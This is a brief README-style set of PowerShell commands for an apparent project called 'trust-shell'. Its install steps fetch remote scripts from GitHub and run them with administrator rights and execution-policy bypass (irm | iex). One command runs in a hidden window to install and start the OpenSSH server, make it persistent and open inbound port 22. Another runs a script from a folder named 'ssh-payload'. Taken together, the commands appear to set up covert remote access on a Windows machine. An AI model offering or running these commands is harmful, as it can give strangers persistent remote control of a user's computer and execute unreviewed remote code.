### To install:
powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://raw.githubusercontent.com/maimunahmed2/trust-shell/main/setup-ssh.ps1 | iex'"

### To uninstall:
powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://raw.githubusercontent.com/maimunahmed2/trust-shell/main/disable-ssh.ps1 | iex'"

### To check availability:
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'

powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType Automatic; if (!(Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 }"




Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "C:\Research\ssh-payload\disable-ssh.ps1"' -Verb RunAs